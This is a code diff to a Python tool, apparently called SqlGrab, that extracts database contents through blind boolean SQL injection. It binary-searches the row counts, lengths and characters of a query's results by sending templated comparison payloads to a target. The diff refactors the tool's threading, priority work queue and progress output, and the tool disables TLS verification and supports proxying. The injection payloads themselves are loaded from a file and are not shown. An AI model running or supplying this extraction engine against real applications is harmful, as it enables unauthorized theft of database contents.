@@ -1,16 +1,19 @@
 from requests import Request, Session, PreparedRequest
 from typing import Callable, Literal
-from concurrent.futures import Future, ThreadPoolExecutor
+from concurrent.futures import Future, ThreadPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler
 from io import BytesIO
+from functools import partial
 from dataclasses import dataclass
 import time
-from queue import Queue
+from threading import Lock
+from queue import Queue, PriorityQueue
 from datetime import datetime
 import math
 import urllib.parse
 import urllib3
 import argparse
+import itertools
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -26,6 +29,8 @@ class HTTPRequest(BaseHTTPRequestHandler):
     def send_error(self, code, message):
         self.error_code = code
         self.error_message = message
+
+print_lock = Lock()
 
 CHAR_MIN = 0x20
 CHAR_MAX = 0x7E
@@ -136,94 +141,28 @@ def _make_payloads(payloads: dict, **kwargs) -> dict[str|dict]:
     return new
 
 @dataclass
-class Context:
-    task_id: int
-    min: int
-    max: int
-    guess: int
+class Value:
+    min: int | None = None
+    max: int | None = None
+    guess: int | None = None
     errored: bool = False
+    started: bool = False
     done: bool = False
-
-@dataclass
-class RowGrabber:
-    parent: 'SqlGrab'
-
-    def grab(self, row) -> str:
-        self.row = row
-        self.payloads = _make_payloads(self.parent.payloads, row=row)
-        length = self._get_length()
-        return self._get_string(length=length)
-
-    def _length_update(self, context: Context, _):
-            print(f'[{self.row + 1}/{self.parent.num_rows}] \x1B[90mDetermining length (between {context.min} and {context.max})\x1B[0m', end='\033[K\r')
-
-    def _get_length(self) -> int:
-        payloads = self.payloads['length']
-        results = self.parent._run_grabbers(
-            workers=[
-                ValueGrabber(
-                    bigger=payloads['>'],
-                    equals=payloads['='],
-                    eval_cb=self.parent.evaluate,
-                    progress=self.parent.progress_queue
-                ).grab
-            ],
-            guess=INITIAL_LENGTH,
-            update=self._length_update
-        )
-        return results[0]
-    
-    def _string_update(self, context: Context, results: list[Context]):
-        results[context.task_id] = context
-        done = [r for r in results if r is not None and r.done]
-        output = f'[{self.row + 1}/{self.parent.num_rows}] \x1B[90m[{str(len(done))}/{str(len(results))}]\x1B[0m '
-        for r in results:
-            output += (
-                f'\x1B[90m-\x1B[0m' if r == None else
-                f'\x1B[31m{chr(r.guess)}\x1B[0m' if r.errored else
-                f'\x1B[32m{chr(r.guess)}\x1B[0m' if r.done else
-                f'\x1b[90m{chr(r.guess)}\x1B[0m'
-            )
-        print(output, end='\033[K\r')
-
-    def _get_string(self, length: int):
-        payloads: dict[str, str] = self.payloads['character']
-        results = self.parent._run_grabbers([
-                ValueGrabber(
-                    bigger=p(payloads['>'], index=i + 1),
-                    equals=p(payloads['='], index=i + 1),
-                    eval_cb=self.parent.evaluate,
-                    task_id=i,
-                    progress=self.parent.progress_queue,
-                    range=(CHAR_MIN, CHAR_MAX)
-                ).grab
-                for i in range(length)
-            ],
-            guess=INITIAL_CHAR,
-            update=self._string_update
-        )
-        result = ''.join([chr(r) for r in results])
-        
-        if not self.parent.evaluate(p(self.payloads['compare'], guess=result)):
-            raise IntegrityError(message=ERR_SANITY_CHECK, partial_result=result)
-
-        return result
 
 @dataclass
 class ValueGrabber:
     bigger: str
     equals: str
-    eval_cb: Callable 
-    progress: Queue
-    task_id: int | None = None
+    eval_func: Callable 
+    progress: Value | None = None
     range: tuple[int,int] = (0,math.inf)
 
     def grab(self, guess: int) -> int:
         ''' Determines the value of a variable based on iterative halving/doubling of the search space '''
-        min, max = self.range       
+        min, max = self.range 
 
         while min != max:
-            is_bigger = self.eval_cb(
+            is_bigger = self.eval_func(
                 self.bigger.format(guess=guess)
             )
             if is_bigger:
@@ -236,18 +175,112 @@ class ValueGrabber:
             else: # narrow down between that range
                 guess = min + int((max - min) / 2)
             
-            progress = Context(self.task_id, min, max, guess)
-            self.progress.put(progress)
+            if self.progress:
+                self.progress.started = True     
+                self.progress.min = min
+                self.progress.max = max
+                self.progress.guess = guess
 
             if guess > 2**32:
                 raise RuntimeError(ERR_UPPER_BOUND)
-
-        if self.eval_cb(self.equals.format(guess=guess)):
-            progress.done = True
-        else:
-            progress.errored = True
-        self.progress.put(progress)
+            
+        if self.progress:
+            if self.eval_func(self.equals.format(guess=guess)):
+                self.progress.done = True
+            else:
+                self.progress.errored = True
+                raise RuntimeError(ERR_SANITY_CHECK)
         return guess
+
+@dataclass
+class RowGrabber:
+    parent: 'SqlGrab'
+    row: int
+    progress: list
+
+    def __post_init__(self) -> None:
+        self.payloads = _make_payloads(self.parent.payloads, row=self.row)
+
+    def prepare(self) -> list[Future]:
+        payloads = self.payloads['length']
+        length = ValueGrabber(
+            bigger=payloads['>'],
+            equals=payloads['='],
+            eval_func=self.parent.evaluate
+        ).grab(guess=INITIAL_LENGTH)
+        return self.get_futures(length)
+
+    def get_futures(self, length: int) -> list[Future]:
+        payloads: dict[str, str] = self.payloads['character']
+        for _ in range(length):
+            self.progress.append(Value())
+        futures = [self.parent.work_queue.enqueue(
+            priority=self.row,
+            work=ValueGrabber(
+                bigger=p(payloads['>'], index=i + 1),
+                equals=p(payloads['='], index=i + 1),
+                eval_func=self.parent.evaluate,
+                progress=self.progress[i],
+                range=(CHAR_MIN, CHAR_MAX)
+            ).grab,
+            guess=INITIAL_CHAR
+        ) for i in range(length)]
+        return futures
+
+    def _get_length(self) -> int:
+        payloads = self.payloads['length']
+        future = self.parent.work_queue.enqueue(
+            priority=self.row,
+            work=ValueGrabber(
+                bigger=payloads['>'],
+                equals=payloads['='],
+                eval_func=self.parent.evaluate
+            ).grab,
+            guess=INITIAL_LENGTH,
+        )
+        return future.result()
+
+
+class PriorityWorkerQueue:
+    def __init__(self, max_workers: int, debug=False):
+        self._task_queue = PriorityQueue()
+        self._executor = ThreadPoolExecutor(max_workers=max_workers)
+        self._counter = itertools.count()  # tie-breaker
+        self._debug = debug
+        for _ in range(max_workers):
+            self._executor.submit(self._worker_loop)
+
+    def enqueue(self, priority: int, work: Callable, **kwargs):
+        future = Future()
+        count = next(self._counter)
+        if self._debug:
+            with print_lock:
+                print(f'Queued {(priority, count, kwargs)}')
+        self._task_queue.put( (priority, count, work, kwargs, future) )
+        return future
+
+    def _worker_loop(self):
+        while not self._task_queue.is_shutdown:
+            future: Future
+            priority, count, work, kwargs, future = self._task_queue.get()
+            if self._debug:
+                with print_lock:
+                    print(f'Running {(priority, count, kwargs)}')
+            try:
+                result = work(**kwargs)
+                if self._debug:
+                    with print_lock:
+                        print(f'Finished {(priority, count, kwargs)} ' + str(result))
+            except Exception as e:
+                future.set_exception(e)
+            else:
+                future.set_result(result)
+            finally:
+                self._task_queue.task_done()
+
+    def shutdown(self):
+        self._task_queue.shutdown()
+        self._executor.shutdown()
 
 @dataclass
 class SqlGrab:
@@ -259,7 +292,7 @@ class SqlGrab:
     urlencode: bool=False
     proxy: str | None = None
     output: bool=False
-    requests: int = 0
+    requests_sent: int = 0
     progress_queue: Queue = Queue()
 
     def __post_init__(self):
@@ -268,7 +301,6 @@ class SqlGrab:
             'http': self.proxy,
             'https': self.proxy
         } if self.proxy else {}
-        self.executor = ThreadPoolExecutor(max_workers=self.threads)
 
     @classmethod
     def fromFile(
@@ -279,25 +311,36 @@ class SqlGrab:
             **kwargs
         )
     
-    def _count_update(self, context: Context, _):
+    def _count_update(self, context: Value, _):
             print(f'[+] \x1B[90mDetermining result row count (between {context.min} and {context.max})\x1B[0m\033[K', end='\033[K\r')
 
     def _get_count(self) -> int:
         payloads = self.payloads['count']
-        results = self._run_grabbers(
-            workers=[
-                ValueGrabber(
-                    bigger=payloads['>'],
-                    equals=payloads['='],
-                    eval_cb=self.evaluate,
-                    progress=self.progress_queue
-                ).grab
-            ],
-            guess=INITIAL_LENGTH,
-            update=self._count_update
+        future = self.work_queue.enqueue(
+            0,
+            ValueGrabber(
+                bigger=payloads['>'],
+                equals=payloads['='],
+                eval_func=self.evaluate,
+                progress=self.progress_queue
+            ).grab,
+            guess=INITIAL_LENGTH
         )
-        return results[0]
+        return future.result()
+    
 
+    def _update_string(self, progress: list[Value]) -> str:
+        done = [r for r in progress if r and r.done]
+        output = f'\x1B[90m[{len(done)}/{len(progress)}]\x1B[0m '
+        for v in progress:
+            output += (
+                f'\x1B[90m-\x1B[0m' if not v.started else
+                f'\x1B[31m{chr(v.guess)}\x1B[0m' if v.errored else
+                f'\x1B[32m{chr(v.guess)}\x1B[0m' if v.done else
+                f'\x1b[90m{chr(v.guess)}\x1B[0m'
+            )
+        return output
+    
     def grab(self, query: str) -> list[str]:
         if self.output: print(f'[+] Grabbing: \'{query}\'...')
         self.session = Session()
@@ -307,44 +350,47 @@ class SqlGrab:
             row_query=self.payloads['row'],
             query=query
         )
+
+        self.work_queue = PriorityWorkerQueue(max_workers=self.threads)
         start = datetime.now()
-        self.num_rows = self._get_count()
-        if self.output: print(f'[+] Found {self.num_rows} rows', end='\033[K\n')
+        num_rows = self._get_count()
+        if self.output: print(f'[+] Found {num_rows} rows', end='\033[K\n')
+
         results = []
-        row_grabber = RowGrabber(parent=self)
         has_error = False
-        for row in range(self.num_rows):
-            try:
-                results.append(row_grabber.grab(row))
-            except IntegrityError as e:
+
+        work: list[tuple[int, list[Value|None], Future]] = []
+        for row in range(num_rows):
+            progress = []
+            future = self.work_queue.enqueue(
+                priority=row,
+                work=RowGrabber(self, row, progress).prepare
+            )
+            work.append( (row, progress, future) )
+        
+        for row, progress, future in work:
+            futures: list[Future] = future.result()
+            if self.output: # progress message
+                while not all(f.done() for f in futures):
+                    output = f'[{row + 1}/{num_rows}] {self._update_string(progress)}'
+                    print(output, end='\033[K\r')
+            # await the current row%
+            result = ''.join([chr(f.result()) for f in futures])
+            # sanity check
+            if not self.evaluate(p(self.payloads['compare'], guess=result)):
+                if self.output: print(f'[!] ', end='')
                 has_error = True
-                results.append(e.partial_result)
-            if self.output: print()
+            results.append(result)
+            if self.output: print(output, end='\033[K\n')
+
         elapsed = datetime.now() - start
         if self.output:
-            print(f'[+] Sent {self.requests} requests in {elapsed.total_seconds()} seconds')
+            print(f'[+] Sent {self.requests_sent} requests in {elapsed.total_seconds()} seconds')
             print('\n'.join(results))
             if has_error: print(ERR_SANITY_CHECK)
-        return results
-        
-    def _run_grabbers(self, workers: list[Callable], guess: int, update: Callable) -> list:
-        results: list[Context] = [
-            None for _ in range(len(workers))
-        ]
-        
-        futures: list[Future] = [
-            self.executor.submit(
-                worker,
-                guess=guess
-            ) for worker in workers
-        ]
-        
-        if self.output:
-            while not all(f.done() for f in futures) or not self.progress_queue.empty():
-                context: dict = self.progress_queue.get(block=True)
-                update(context, results)
 
-        return [f.result() for f in futures]
+        self.work_queue.shutdown()
+        return results
 
     @staticmethod
     def urlEncode(text: str) -> str:
@@ -386,7 +432,7 @@ class SqlGrab:
             proxies =self.proxy,
             verify=False
         )
-        self.requests += 1
+        self.requests_sent += 1
         time.sleep(self.delay)
     
         return self.isMatch(response)
